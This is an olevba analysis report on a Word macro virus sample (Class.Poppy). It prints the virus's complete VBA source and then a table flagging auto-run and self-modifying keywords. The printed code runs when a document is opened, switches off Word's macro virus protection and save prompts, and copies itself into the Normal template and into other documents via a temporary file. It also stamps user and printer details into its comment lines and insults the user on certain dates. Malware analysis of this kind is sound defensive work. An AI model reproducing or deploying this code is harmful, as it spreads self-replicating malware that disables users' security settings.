olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-10ecedd9f96f7196e862ac62004c8ffdfa60bfb4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-10ecedd9f96f7196e862ac62004c8ffdfa60bfb4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'Population Council1/15/99 6:17:30 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
On Error GoTo out
'Population Council1/15/99 6:17:30 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
Options.VirusProtection = False
'Population Council1/15/99 6:17:30 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
Options.SaveNormalPrompt = False
'Population Council1/15/99 6:17:30 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
Options.ConfirmConversions = False
'Population Council1/15/99 6:17:30 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Population Council1/15/99 6:17:30 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Population Council1/15/99 6:17:30 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
If nt > 70 And ad > 0 Then GoTo out
'Population Council1/15/99 6:17:30 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
If nt < 70 Then
'Population Council1/15/99 6:17:30 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Population Council1/15/99 6:17:30 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Population Council1/15/99 6:17:30 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Population Council1/15/99 6:17:30 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
End If
'Population Council1/15/99 6:17:30 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Population Council1/15/99 6:17:30 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'Population Council1/15/99 6:17:30 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
host.codemodule.AddFromFile ("c:\class.sys")
'Population Council1/15/99 6:17:31 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
With host.codemodule
'Population Council1/15/99 6:17:31 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
    For x = 1 To 4
'Population Council1/15/99 6:17:31 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
    .deletelines 1
'Population Council1/15/99 6:17:31 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
    Next x
'Population Council1/15/99 6:17:31 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
End With
'Population Council1/15/99 6:17:31 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
If nt < 70 Then
'Population Council1/15/99 6:17:31 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
    With host.codemodule
'Population Council1/15/99 6:17:31 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
    .replaceline 1, "Sub AutoClose()"
'Population Council1/15/99 6:17:31 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
    .replaceline 71, "Sub ToolsMacro()"
'Population Council1/15/99 6:17:31 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
    End With
'Population Council1/15/99 6:17:31 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
End If
'Population Council1/15/99 6:17:31 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
With host.codemodule
'Population Council1/15/99 6:17:31 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
    For x = 2 To 72 Step 2
'Population Council1/15/99 6:17:31 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'Population Council1/15/99 6:17:31 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
    Next x
'Population Council1/15/99 6:17:31 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
End With
'Population Council1/15/99 6:17:31 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
out:
'Population Council1/15/99 6:17:31 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Population Council1/15/99 6:17:31 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
End Sub
'Population Council1/15/99 6:17:31 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
Sub ViewVBCode()
'Population Council1/15/99 6:17:31 PMHP LaserJet 5/5M PostScript on \\NETSERVER\HPLASERJReference ListClippit
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

